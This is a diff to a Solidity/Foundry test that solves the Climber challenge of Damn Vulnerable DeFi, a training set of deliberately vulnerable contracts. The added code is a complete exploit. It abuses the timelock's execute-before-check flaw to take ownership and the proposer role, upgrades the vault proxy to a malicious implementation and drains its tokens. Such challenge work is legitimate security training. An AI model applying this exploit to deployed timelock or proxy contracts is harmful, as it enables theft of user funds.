@@ -8,6 +8,11 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {AttackScheduler} from "../../../src/Contracts/climber/AttackScheduler.sol";
+import {CrackedVault} from "../../../src/Contracts/climber/CrackedVault.sol";
+import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";
+import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -72,7 +77,31 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        AttackScheduler attackScheduler = new AttackScheduler(address(climberTimelock), address(climberVaultProxy));
+
+        address[] memory targets = new address[](3);
+        uint256[] memory values = new uint256[](3);
+        bytes[] memory dataElements = new bytes[](3);
+
+        targets[0] = address(climberVaultProxy);
+        dataElements[0] = abi.encodeCall(OwnableUpgradeable.transferOwnership, (address(attacker)));
+
+        targets[1] = address(climberTimelock);
+        dataElements[1] =
+            abi.encodeCall(AccessControl.grantRole, (keccak256("PROPOSER_ROLE"), address(attackScheduler)));
+
+        targets[2] = address(attackScheduler);
+        dataElements[2] = abi.encodeCall(AttackScheduler.schedule, ());
+
+        climberTimelock.execute(targets, values, dataElements, 0);
+
+        CrackedVault crackedVault = new CrackedVault();
+        UUPSUpgradeable(address(climberVaultProxy)).upgradeTo(address(crackedVault));
+        CrackedVault(address(climberVaultProxy)).stealFunds(address(dvt));
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
